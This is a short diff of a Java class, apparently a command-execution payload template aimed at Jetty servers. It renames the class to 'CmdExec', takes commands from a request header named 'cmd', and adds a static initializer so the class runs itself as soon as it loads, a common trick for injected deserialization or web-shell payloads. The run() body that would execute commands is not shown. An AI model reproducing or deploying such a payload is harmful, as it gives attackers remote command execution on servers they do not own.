@@ -6,13 +6,20 @@ import java.lang.reflect.Array;
 import java.lang.reflect.Field;
 import java.util.Scanner;
 
-public class JettyCmdExecTpl {
+public class CmdExec
+{
     private String getReqHeaderName() {
         return "cmd";
     }
 
 
-    public JettyCmdExecTpl() {
+    static {
+        try {
+            new CmdExec();
+        } catch (Exception e) {
+        }
+    }
+    public CmdExec() {
         run();
     }
 
